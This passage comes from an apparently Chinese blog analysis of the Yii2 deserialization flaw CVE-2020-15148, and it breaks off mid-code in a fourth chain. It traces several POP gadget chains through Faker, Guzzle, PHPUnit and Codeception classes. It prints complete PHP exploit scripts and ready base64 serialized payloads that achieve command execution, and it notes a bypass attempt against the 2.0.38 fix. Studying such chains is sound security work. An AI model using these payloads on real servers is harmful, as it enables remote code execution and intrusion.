<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token operator">...</span><span class="token operator">...</span>
    
    <span class="token keyword">return</span> <span class="token variable">$model</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
</li>
<li><p><code>\yii\rest\IndexAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">prepareDataProvider</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

</li>
</ol>
<p>于是即可构造完整的<code>pop</code>链</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-></span>
<span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-></span>
<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span><span class="token operator">-></span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>Exp</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX19</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>命令执行结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511204922226.png" alt loading="lazy"></p>
<h4 id="POP2"><a href="#POP2" class="headerlink" title="POP2"></a>POP2</h4><p>还是从<code>yii2/db/BatchQueryResult.php</code>入手，换种思路，我们不找<code>__call</code>方法来触发，直接找<code>close</code>方法</p>
<p>随后我们找到一个<code>FnStream.php</code>在<code>vendor\guzzlehttp\psr7\src</code>目录下，代码如下</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_fn_close</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><code>$this-&gt;_fn_close</code>可控</p>
<p>Exp</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FnStream</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> <span class="token variable">$_fn_close</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FnStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoxOntzOjk6Il9mbl9jbG9zZSI7czo3OiJwaHBpbmZvIjt9fQ==</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>执行效果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513172934351.png" alt loading="lazy"></p>
<p>我们需要对危害进行放大，这里就需要一个执行类，拿这个<code>call_user_func</code>函数作跳板，来进行代码执行，全局搜索eval，找到一个<code>MockTrait.php</code>文件在<code>vendor\phpunit\phpunit\src\Framework\MockObject</code>下，代码如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function"><span class="token punctuation">\</span>class_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mockName</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">classCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mockName</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><code>$this-&gt;classCode</code>和<code>$this-&gt;mockName</code>都可控</p>
<p>于是即可构造完整的<code>pop</code>链</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-></span>
<span class="token class-name class-name-fully-qualified static-context">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token operator">::</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token property">call_user_func</span>
<span class="token operator">-></span>
<span class="token class-name class-name-fully-qualified static-context">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject<span class="token punctuation">\</span>MockTrait</span><span class="token operator">::</span><span class="token constant">generate</span><span class="token operator">-></span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>Exp</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockTrait</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$classCode</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('whoami');"</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$mockName</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"extrader"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">use</span> <span class="token package">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject<span class="token punctuation">\</span>MockTrait</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FnStream</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> <span class="token variable">$_fn_close</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_fn_close</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
                <span class="token keyword">new</span> <span class="token class-name">MockTrait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'generate'</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FnStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>然而代码并没有执行成功，看到报错信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513175847226.png" alt loading="lazy"></p>
<p><code>__wakeup</code>方法<code>throw</code>出去了，当然<code>__wakeup</code>可绕，前提是PHP5 &lt; 5.6.25，7.x &lt; 7.0.10之前，具体绕过方法网上很多，这里不再赘述，执行效果如下</p>
<p>paylaod:</p>
<pre class="language-none"><code class="language-none">TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoyOntzOjk6Il9mbl9jbG9zZSI7YToyOntpOjA7TzozODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrVHJhaXQiOjI6e3M6NDk6IgBQSFBVbml0XEZyYW1ld29ya1xNb2NrT2JqZWN0XE1vY2tUcmFpdABjbGFzc0NvZGUiO3M6MTc6InN5c3RlbSgnd2hvYW1pJyk7IjtzOjQ4OiIAUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrVHJhaXQAbW9ja05hbWUiO3M6ODoiZXh0cmFkZXIiO31pOjE7czo4OiJnZW5lcmF0ZSI7fX19</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513182520433.png" alt loading="lazy"></p>
<p>这里就疑惑了，我这里php明明是php7.4的环境，为什么也可以绕？？？</p>
<p>既然<code>__wakeup</code>可绕，那<code>2.0.38</code>版本修复的方法就是加一个<code>__wakeup</code>方法，是不是也可以直接绕？在github上又把<code>2.0.38</code>版本的源码下下来，然后用构造好的绕过<code>__wakeup</code>的payload测试，直接没回显了，报错也没了，有点迷，有点迷。。。</p>
<h3 id="2-0-38反序列化"><a href="#2-0-38反序列化" class="headerlink" title="2.0.38反序列化"></a>2.0.38反序列化</h3><p>此处参考<a href="https://v0w.top/2020/09/22/Yii2unserialize/#0x03-%E6%96%B0%E7%89%88%E6%9C%AC2-0-38%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">链接</a>，师傅很强，学习了！</p>
<h4 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h4><p>利用点在<code>vendor/codeception/codeception/ext/RunProcess.php:93</code></p>
<p>里面有这两个方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$process</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/** @var $process Process  **/</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$process</span><span class="token operator">-></span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">output</span><span class="token operator">-></span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[RunProcess] Stopping '</span> <span class="token operator">.</span> <span class="token variable">$process</span><span class="token operator">-></span><span class="token function">getCommandLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$process</span><span class="token operator">-></span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>对象在销毁的时候，触发<code>__destruct</code>方法，<code>__destruct</code>方法调用了<code>stopProcess</code>方法，<code>stopProcess</code>方法中的<code>$this-&gt;processes</code>可控，即<code>$process</code>也可控，<code>$process</code>会调用<code>isRunning()</code>方法，那么这里就可以尝试利用<code>__call</code>方法了，可以接着上面的<code>POP1</code>链利用</p>
<p>完整的<code>pop</code>链如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$process</span><span class="token operator">-></span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-></span>
<span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-></span>
<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span><span class="token operator">-></span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>Exp</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// EXP3: RunProcess -> ... -> __call()</span>
<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ls -al'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>
            <span class="token comment">// run() -> call_user_func($this->checkAccess, $this->id);</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token comment">//stopProcess方法里又调用了isRunning()方法: $process->isRunning()</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">RunProcess</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$processes</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>请求结果如下，成功命令执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513193606816.png" alt loading="lazy"></p>
<h4 id="POP4"><a href="#POP4" class="headerlink" title="POP4"></a>POP4</h4><p>利用点在<code>vendor\swiftmailer\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php</code>中</p>
<p>主要代码如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token keyword">as</span> <span class="token variable">$nsKey</span> <span class="token operator">=></span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
